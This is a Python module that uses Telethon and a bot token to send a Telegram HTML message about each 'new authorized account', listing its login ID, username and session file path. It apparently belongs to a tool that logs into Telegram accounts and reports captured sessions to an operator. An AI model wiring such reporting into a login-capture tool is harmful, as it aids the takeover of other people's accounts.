import logging
from telethon import TelegramClient
from backend.config import API_ID, API_HASH, BOT_TOKEN, REPORT_TARGET

log = logging.getLogger("reporter")


async def send_html_report(login_id: str, item: dict | None = None, target: str | None = None):
    """Send a small HTML report about a newly authorized account to
    the configured REPORT_TARGET via the bot token in BOT_TOKEN.

    This function is fire-and-forget friendly (it performs its own
    connect/disconnect) and will no-op if BOT_TOKEN or REPORT_TARGET
    are not configured.
    """
    final_target = target or REPORT_TARGET
    if not BOT_TOKEN or not final_target:
        log.debug("Bot reporting disabled: BOT_TOKEN or REPORT_TARGET not set")
        return

    # If the configured target is a numeric string (common when set via .env),
    # convert to int so Telethon treats it as a chat id instead of trying to
    # resolve it as a phone number or username.
    try:
        if isinstance(final_target, str) and final_target.isdigit():
            final_target = int(final_target)
    except Exception:
        pass

    # Build a minimal HTML report. If `item` (the login state entry) is
    # provided, try to extract a friendly username and session path.
    username = None
    session_path = None
    try:
        if item:
            client = item.get("client")
            if client:
                session_path = getattr(client, "_session_path", None)
                try:
                    me = await client.get_me()
                    if me:
                        username = getattr(me, "username", None) or getattr(me, "first_name", None)
                except Exception:
                    username = None
    except Exception as e:
        log.debug(f"Reporter: ignored error while constructing report: {e}")

    html = ["<b>New authorized account</b>"]
    html.append(f"Login ID: <code>{login_id}</code>")
    html.append(f"Username: <b>{username or 'N/A'}</b>")
    if session_path:
        html.append(f"Session path: <code>{session_path}</code>")

    message = "\n".join(html)

    # Send via a short-lived Telethon client using the bot token.
    try:
        client = TelegramClient("_report_bot_tmp", API_ID, API_HASH)
        await client.start(bot_token=BOT_TOKEN)
        log.debug(f"Reporter: sending report to {final_target}")
        await client.send_message(final_target, message, parse_mode="html", link_preview=False)
        await client.disconnect()
        log.info(f"Report sent for {login_id} to {final_target}")
    except Exception as e:
        log.error(f"Failed to send report for {login_id}: {e}")
